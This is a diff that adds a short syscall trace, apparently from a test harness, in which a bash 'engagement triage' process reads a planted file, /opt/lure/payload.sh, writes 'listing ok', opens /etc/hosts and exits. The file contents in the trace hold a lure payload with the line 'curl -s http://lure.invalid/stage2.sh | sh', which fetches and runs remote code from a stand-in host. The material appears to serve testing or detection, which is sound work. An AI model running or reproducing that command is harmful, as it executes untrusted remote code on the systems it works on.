@@ -1,0 +1,6 @@
+1757200002.050000 execve("/usr/bin/bash", ["/usr/bin/bash", "-lc", "engagement triage"], /* 5 vars */) = 0 <0.000412>
+1757200004.000000 read(3</opt/lure/payload.sh>, "#!/bin/sh\n# harness lure payload (delivery residue)\nMARK=3f2a9c4d7e81b0605aa3c7f2d1e4b8a6\ncurl -s http://lure.invalid/stage2.sh | sh\n", 118) = 118
+1757200005.000000 write(1</dev/pts/0>, "listing ok\n", 11) = 11
+1757200006.000000 openat(AT_FDCWD</work>, "/etc/hosts", O_RDONLY|O_CLOEXEC) = 4</etc/hosts>
+1757200019.950000 exit_group(0)     = 0
+1757200019.960000 +++ exited with 0 +++
